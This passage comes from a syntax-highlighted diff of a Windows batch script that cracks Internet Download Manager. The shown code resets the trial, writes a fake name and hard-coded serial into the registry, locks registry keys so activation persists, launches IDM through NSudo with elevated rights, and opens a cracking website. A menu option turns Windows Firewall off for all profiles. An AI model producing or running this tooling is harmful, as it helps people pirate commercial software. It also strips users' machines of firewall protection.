+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_erl%</span><span class=o>==</span>4 <span class=k>call</span> <span class=p>:</span><span class=nl>readme</span><span class=p>&amp;</span><span class=k>goto</span> <span class=nl>MainMenu</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_erl%</span><span class=o>==</span>3 <span class=k>call</span> <span class=p>:</span><span class=nl>_tog_Firewall</span><span class=p>&amp;</span><span class=k>goto</span> <span class=nl>MainMenu</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_erl%</span><span class=o>==</span>2 <span class=k>goto</span> <span class=nl>_reset</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_erl%</span><span class=o>==</span>1 <span class=k>goto</span> <span class=nl>_activate</span>
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=p>:</span><span class=nl>MainMenu</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_tog_Firewall</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_status%</span><span class=o>==</span>Enabled <span class=p>(</span>
+</span></span><span class=line><span class=cl>netsh AdvFirewall Set AllProfiles State Off <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>netsh AdvFirewall Set AllProfiles State On <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>readme</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_ReadMe=</span><span class=nv>%SystemRoot%</span><span class=s2>\Temp\ReadMe.txt&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>%_ReadMe%</span><span class=s2>&#34;</span> <span class=k>del</span> /f /q <span class=s2>&#34;</span><span class=nv>%_ReadMe%</span><span class=s2>&#34;</span> <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>export</span> txt <span class=s2>&#34;</span><span class=nv>%_ReadMe%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>start</span> notepad <span class=s2>&#34;</span><span class=nv>%_ReadMe%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>timeout /t 2 <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl><span class=k>del</span> /f /q <span class=s2>&#34;</span><span class=nv>%_ReadMe%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:  Extract the text from batch script without character and file encoding issue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>export</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>%nul%</span> <span class=nv>%_psc%</span> <span class=s2>&#34;$f=[io.file]::ReadAllText(&#39;!_batp!&#39;) -split \&#34;</span>:<span class=nv>%~1</span>\:.*`r`n\<span class=s2>&#34;; [io.file]::WriteAllText(&#39;</span><span class=nv>%~2</span><span class=s2>&#39;,$f[1].Trim(),[System.Text.Encoding]::ASCII);&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span>/b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>TITLE</span> <span class=nv>%title%</span>
+</span></span><span class=line><span class=cl>MODE CON: COLS=89 LINES=13
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_error</span><span class=p>=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg query <span class=s2>&#34;HKCU\Software\DownloadManager&#34;</span> <span class=s2>&#34;/v&#34;</span> <span class=s2>&#34;Serial&#34;</span> <span class=nv>%nul%</span> <span class=p>&amp;&amp;</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%idmcheck%</span> <span class=p>&amp;&amp;</span> taskkill /f /im idman.exe  <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>!_appdata!</span><span class=s2>\DMCache\settings.bak&#34;</span> <span class=k>del</span> /s /f /q <span class=s2>&#34;</span><span class=nv>!_appdata!</span><span class=s2>\DMCache\settings.bak&#34;</span>  <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_action=call :delete_key&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>%line%</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>_error</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Green%</span> <span class=s2>&#34;IDM Activation - Trial is successfully reset in the registry.&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Red%</span> <span class=s2>&#34;Failed to completely reset IDM Activation - Trial.&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>done</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_activate</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>TITLE</span> <span class=nv>%title%</span>
+</span></span><span class=line><span class=cl>MODE CON: COLS=89 LINES=25
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_error</span><span class=p>=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>!IDMan!</span><span class=s2>&#34;</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Red%</span> <span class=s2>&#34;IDM [Internet Download Manager] is not Installed.&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> You can download it from  https://www.internetdownloadmanager.com/download.html
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>done</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Internet check with internetdownloadmanager.com ping and port 80 test</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ping -n 1 internetdownloadmanager.com <span class=p>&gt;</span>nul <span class=p>||</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%_psc%</span> <span class=s2>&#34;$t = New-Object Net.Sockets.TcpClient;try{$t.Connect(&#34;&#34;&#34;</span>internetdownloadmanager.com<span class=s2>&#34;&#34;&#34;, 80)}catch{};$t.Connected&#34;</span> <span class=p>|</span> findstr /i true <span class=mi>1</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> [<span class=nv>%errorlevel%</span>]<span class=o>==</span>[0] <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Red%</span> <span class=s2>&#34;Unable to connect internetdownloadmanager.com, aborting...&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>done</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Internet is connected.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>%idmcheck%</span> <span class=p>&amp;&amp;</span> taskkill /f /im idman.exe <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>!_appdata!</span><span class=s2>\DMCache\settings.bak&#34;</span> <span class=k>del</span> /s /f /q <span class=s2>&#34;</span><span class=nv>!_appdata!</span><span class=s2>\DMCache\settings.bak&#34;</span> <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_action=call :delete_key&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_action=call :count_key&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>register_IDM</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>_derror</span> <span class=k>call</span> <span class=p>:</span><span class=nl>f_reset</span> <span class=p>&amp;</span> <span class=k>goto</span> <span class=nl>done</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>lockedkeys</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_action=call :lock_key&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Locking registry keys...
+</span></span><span class=line><span class=cl><span class=c1>rem echo:</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>action</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>_error</span> <span class=k>if</span> [<span class=nv>%lockedkeys%</span>] <span class=ow>GEQ</span> [7] <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>%line%</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Green%</span> <span class=s2>&#34;IDM is successfully activated.&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Gray%</span> <span class=s2>&#34;If fake serial screen appears, run activation option again, after that it wont appear.&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>done</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>f_reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>done</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>NSudo86x -U:C -P:E -UseCurrentConsole <span class=s2>&#34;</span><span class=nv>!IDMan!</span><span class=s2>&#34;</span> /onboot <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>start</span> <span class=s2>&#34;&#34;</span> <span class=s2>&#34;www.crackingcity.com&#34;</span> <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>%line%</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>Unattended</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Press any key to exit...
+</span></span><span class=line><span class=cl><span class=k>pause</span> <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%_Yellow%</span> <span class=s2>&#34;Press any key to return...&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>pause</span> <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>MainMenu</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>done2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>Unattended</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Press any key to exit...
+</span></span><span class=line><span class=cl><span class=k>pause</span> <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Press any key to exit...
+</span></span><span class=line><span class=cl><span class=k>pause</span> <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>homepage</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>cls</span>
+</span></span><span class=line><span class=cl><span class=k>start</span> https://www.crackingcity.com
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>MainMenu</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>f_reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>%line%</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Red%</span> <span class=s2>&#34;Error found, resetting IDM activation...&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_action=call :delete_key&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>reset</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>%line%</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Red%</span> <span class=s2>&#34;Failed to activate IDM.&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>reset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>take_permission</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>delete_queue</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>take_permission</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>action</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>add_key</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_rcont</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg add <span class=nv>%reg%</span> <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_add_key</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>register_IDM</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> Applying registration details...
+</span></span><span class=line><span class=cl><span class=c1>rem echo:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>If</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>name</span> <span class=k>set</span> <span class=nv>name</span><span class=p>=</span>Tonec FZE
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=HKCU\SOFTWARE\DownloadManager /v FName /t REG_SZ /d &#34;</span><span class=nv>%name%</span><span class=s2>&#34;&#34;</span> <span class=p>&amp;</span> <span class=k>call</span> <span class=p>:</span><span class=nl>_rcont</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=HKCU\SOFTWARE\DownloadManager /v LName /t REG_SZ /d &#34;&#34;&#34;</span> <span class=p>&amp;</span> <span class=k>call</span> <span class=p>:</span><span class=nl>_rcont</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=HKCU\SOFTWARE\DownloadManager /v Email /t REG_SZ /d &#34;</span>info@tonec.com<span class=s2>&#34;&#34;</span> <span class=p>&amp;</span> <span class=k>call</span> <span class=p>:</span><span class=nl>_rcont</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;reg=HKCU\SOFTWARE\DownloadManager /v Serial /t REG_SZ /d &#34;</span>R953G-JE15D-5FCTH-50SNV<span class=s2>&#34;&#34;</span> <span class=p>&amp;</span> <span class=k>call</span> <span class=p>:</span><span class=nl>_rcont</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> Triggering a few downloads to create certain registry keys, please wait...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;file=</span><span class=nv>%_temp%</span><span class=s2>\temp.png&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_fileexist</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_derror</span><span class=p>=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>%idmcheck%</span> <span class=p>&amp;&amp;</span> taskkill /f /im idman.exe
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>link</span><span class=p>=</span>https://www.internetdownloadmanager.com/images/idm_box_min.png
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>download</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>link</span><span class=p>=</span>https://www.internetdownloadmanager.com/register/IDMlib/images/idman_logos.png
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>download</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: it may take some time to reflect registry keys.</span>
+</span></span><span class=line><span class=cl>timeout /t 3 <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>foundkeys</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>action</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> [<span class=nv>%foundkeys%</span>] <span class=ow>GEQ</span> [7] <span class=k>goto</span> <span class=nl>_skip</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>link</span><span class=p>=</span>https://www.internetdownloadmanager.com/pictures/idm_about.png
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>download</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>link</span><span class=p>=</span>https://www.internetdownloadmanager.com/languages/indian.png
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>download</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>timeout /t 3 <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>foundkeys</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>action</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> [<span class=nv>%foundkeys%</span>] <span class=ow>GEQ</span> [7] <span class=k>set</span> <span class=nv>_derror</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>_skip</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>_derror</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Required registry keys were created successfully.
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>_fileexist</span> <span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Red%</span> <span class=s2>&#34;Unable to download files with IDM.&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Red%</span> <span class=s2>&#34;Failed to create required registry keys.&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color</span> <span class=nv>%Magenta%</span> <span class=s2>&#34;Try again - disable Windows firewall with script options - check Read Me.&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>rem echo:</span>
+</span></span><span class=line><span class=cl><span class=nv>%idmcheck%</span> <span class=p>&amp;&amp;</span> taskkill /f /im idman.exe <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>%file%</span><span class=s2>&#34;</span> <span class=k>del</span> /f /q <span class=s2>&#34;</span><span class=nv>%file%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>download</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=k>/a</span> <span class=nv>attempt</span><span class=o>=</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>%file%</span><span class=s2>&#34;</span> <span class=k>del</span> /f /q <span class=s2>&#34;</span><span class=nv>%file%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>start</span> <span class=s2>&#34;&#34;</span> /B <span class=s2>&#34;</span><span class=nv>!IDMan!</span><span class=s2>&#34;</span> /n /d <span class=s2>&#34;</span><span class=nv>%link%</span><span class=s2>&#34;</span> /p <span class=s2>&#34;</span><span class=nv>%_temp%</span><span class=s2>&#34;</span> /f temp.png
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>check_file</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>timeout /t 1 <span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=k>/a</span> <span class=nv>attempt</span><span class=o>+=</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>%file%</span><span class=s2>&#34;</span> <span class=k>set</span> <span class=nv>_fileexist</span><span class=p>=</span>1<span class=p>&amp;</span><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%attempt%</span> <span class=ow>GEQ</span> 20 <span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=p>:</span><span class=nl>Check_file</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>delete_queue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span> Deleting registry keys...
+</span></span><span class=line><span class=cl><span class=c1>rem echo:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=se>%%</span># <span class=k>in</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>FName<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>LName<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>Email<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>Serial<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>scansk<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>tvfrdt<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>radxcnt<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>LstCheck<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>ptrk_scdt<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;</span>HKCU\Software\DownloadManager<span class=s2>&#34; &#34;</span>/v<span class=s2>&#34; &#34;</span>LastCheckQU<span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;</span><span class=nv>%HKLM%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>do</span> <span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;tokens=* delims=&#34;</span> <span class=se>%%</span>A <span class=k>in</span> <span class=p>(</span><span class=s2>&#34;</span><span class=se>%%</span><span class=s2>~#&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
